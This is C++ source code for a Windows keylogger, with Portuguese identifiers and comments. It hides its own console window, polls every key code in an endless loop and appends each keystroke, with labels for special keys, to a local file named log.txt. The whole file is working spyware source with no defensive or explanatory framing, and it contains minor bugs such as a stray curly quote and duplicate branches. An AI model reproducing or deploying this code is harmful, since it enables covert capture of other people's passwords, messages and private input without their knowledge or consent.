#include <iostream>
#include <windows.h>
#include <stdio.h>

using namespace std;

void Stealth();
int salvar(int tecla, char *file);

int main()
{
  HWND window;
    AllocConsole();
    window=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(window,0);
    char a;

    while(true){

        for(a=8;a<=255;a++){           
		   if(GetAsyncKeyState(a) == -32767) // captura as teclas !!
            salvar(a,"log.txt");
        }

    }

    return 0;
}












int salvar(int tecla, char *file){


    FILE *newarquivo;
    newarquivo = fopen(file, "a+");

   // cout << tecla;

 //   fprintf(newarquivo, "%s", &tecla);
	
	if (tecla == 8)
        fprintf(newarquivo, "%s", "[BACKSPACE]");
    else if (tecla == 13)
        fprintf(newarquivo, "%s", "\n");
   else if (tecla == VK_SPACE)
        fprintf(newarquivo, "%s", "[SPACE]");
    else if (tecla == 32)
        fprintf(newarquivo, "%s", " ");
    else if (tecla == VK_TAB)
        fprintf(newarquivo, "%s", "[TAB]");
    else if (tecla == VK_SHIFT)
        fprintf(newarquivo, "%s", "[SHIFT]");
    else if (tecla == VK_CONTROL)
        fprintf(newarquivo, "%s", "[CONTROL]");
    else if (tecla == VK_ESCAPE)
        fprintf(newarquivo, "%s", "[ESCAPE]");
    else if (tecla == VK_END)
        fprintf(newarquivo, "%s", "[END]");
    else if (tecla == VK_HOME)
        fprintf(newarquivo, "%s", "[HOME]");
    else if (tecla == VK_LEFT)
        fprintf(newarquivo, "%s", "[LEFT]");
    else if (tecla == VK_UP)
        fprintf(newarquivo, "%s", "[UP]");
    else if (tecla == VK_RIGHT)
        fprintf(newarquivo, "%s", "[RIGHT]");
    else if (tecla == 13)
        fprintf(newarquivo, "%s", "[ENTER]");
    else if (tecla == VK_DOWN)
        fprintf(newarquivo, "%s", "[DOWN]");
    else if (tecla == 20)
        fprintf(newarquivo, "%s", "[CAPSLOCK]");
    else if (tecla == 190 || tecla == 110)
        fprintf(newarquivo, "%s", ".");
    else
        fprintf(newarquivo, "%s", &tecla);
fclose(newarquivo);

return 0;
}  











void Stealth()
{
  HWND Stealth;
  AllocConsole();
 Stealth = FindWindow("ConsoleWindowClass”", NULL);
  ShowWindow(Stealth,0);

  }
  